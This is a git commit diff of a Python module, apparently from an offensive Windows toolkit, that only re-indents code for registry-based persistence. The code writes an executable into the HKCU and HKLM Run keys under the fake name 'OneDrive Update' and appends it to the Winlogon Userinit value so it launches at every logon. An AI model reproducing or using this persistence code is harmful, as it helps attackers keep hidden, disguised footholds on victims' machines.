4eaad866fb0e3fc8184047bc10a25bd53d50da19
rootm0s <rickardmalmkvist@hotmail.com>
2018-05-05 02:19:34 +0200

    Update registry_persistence.py

--- registry_persistence.py
+++ registry_persistence.py
@@ -24,12 +24,12 @@ def HKCU_run_persistence(exe_path):
 	print " {} HKCU_run_persistence: Attempting to create HKCU run registry key".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
+					os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
 		_winreg.SetValueEx(key,
-						"OneDrive Update",
-						0,
-						_winreg.REG_SZ,
-						exe_path)
+				"OneDrive Update",
+				0,
+				_winreg.REG_SZ,
+				exe_path)
 		print " {} HKCU_run_persistence: Successfully created HKCU run registry key".format(successBox())
 	except Exception as error:
 		print " {} HKCU_run_persistence: Unable to create HKCU run registry key".format(errorBox())
@@ -41,12 +41,12 @@ def HKLM_run_persistence(exe_path):
 		print " {} HKLM_run_persistence: We are running as admin, we can proceed".format(infoBox())
 		try:
 			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
-									os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
+						os.path.join("Software\Microsoft\Windows\CurrentVersion\Run"))
 			_winreg.SetValueEx(key,
-							"OneDrive Update",
-							0,
-							_winreg.REG_SZ,
-							exe_path)
+					"OneDrive Update",
+					0,
+					_winreg.REG_SZ,
+					exe_path)
 			print " {} HKLM_run_persistence: Successfully created HKLM run registry key".format(successBox())
 		except Exception as error:
 			print " {} HKLM_run_persistence: Unable to create HKLM run registry key".format(errorBox())
@@ -61,12 +61,12 @@ def HKLM_userinit_persistence(exe_path):
 		print " {} HKLM_userinit_persistence: We are running as admin, we can proceed".format(infoBox())
 		try:
 			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,
-									os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Winlogon"))
+						os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Winlogon"))
 			_winreg.SetValueEx(key,
-							"Userinit",
-							0,
-							_winreg.REG_SZ,
-							"c:\windows\system32\userinit.exe,{}".format(exe_path))
+					"Userinit",
+					0,
+					_winreg.REG_SZ,
+					"c:\windows\system32\userinit.exe,{}".format(exe_path))
 			print " {} HKLM_userinit_persistence: Successfully created HKLM userinit registry key".format(successBox())				
 		except Exception as error:
 			print " {} HKLM_userinit_persistence: Unable to create HKLM userinit registry key".format(errorBox())
